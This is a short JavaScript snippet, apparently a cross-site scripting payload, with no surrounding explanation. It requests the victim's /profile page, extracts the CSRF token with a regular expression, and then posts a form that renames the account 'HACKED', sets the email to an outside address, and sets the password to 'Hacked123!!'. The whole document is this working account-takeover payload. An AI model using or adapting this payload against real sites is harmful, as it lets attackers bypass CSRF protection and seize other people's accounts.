var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('GET','/profile',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="_token" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('POST', '/profile', true);
    changeReq.send('_token='+token+'&name=HACKED&email=bayan29846@chansd.com&gravataremail=&password=Hacked123!!&password_confirm=Hacked123!!')
};
